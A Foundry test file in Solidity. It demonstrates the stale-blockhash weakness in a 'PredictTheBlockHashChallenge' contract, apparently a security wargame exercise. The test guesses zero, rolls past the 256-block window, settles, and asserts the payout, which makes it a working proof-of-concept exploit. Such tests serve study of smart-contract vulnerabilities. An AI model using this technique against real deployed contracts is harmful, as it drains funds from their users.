
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {

    PredictTheBlockHashChallenge public _contractUnderTest;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        _contractUnderTest = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        vm.assume(blockNumber > 0);
        vm.assume(blockNumber < type(uint256).max - 300);

        // --- 2. State Configuration ---
        vm.roll(blockNumber);

        // --- 3. Replication & Assertion ---
        
        // PREDICT THE OUTCOME
        // The vulnerability relies on the fact that blockhash(n) returns 0 
        // if the current block number is more than 256 blocks ahead of n.
        // We predict the outcome will be bytes32(0).
        bytes32 expectedRandom = bytes32(0);
        
        // Lock in the guess with the predicted value
        _contractUnderTest.lockInGuess{value: 1 ether}(expectedRandom);

        // MANIPULATE BLOCK ENVIRONMENT
        // The target block recorded is blockNumber + 1.
        // We need to roll forward past the 256 block limit to force blockhash to return 0.
        // Target: blockNumber + 1. Limit: Target + 256. Current needs to be > Limit.
        uint256 futureBlock = blockNumber + 1 + 257;
        vm.roll(futureBlock);

        // Replicate the vulnerable logic locally
        // The contract calculates: bytes32 answer = blockhash(guesses[msg.sender].block);
        uint256 targetBlock = blockNumber + 1;
        bytes32 actualRandom = blockhash(targetBlock);

        // ASSERT PREDICTABILITY
        assertEq(actualRandom, expectedRandom, "Randomness should be predictable (zero) given block state");

        // EXECUTE
        // Verify the contract accepts this predicted value and pays out
        uint256 balanceBefore = address(this).balance;
        _contractUnderTest.settle();
        uint256 balanceAfter = address(this).balance;

        assertEq(balanceAfter, balanceBefore + 2 ether, "Contract should have paid out based on predictable randomness");
    }

    receive() external payable {}
}
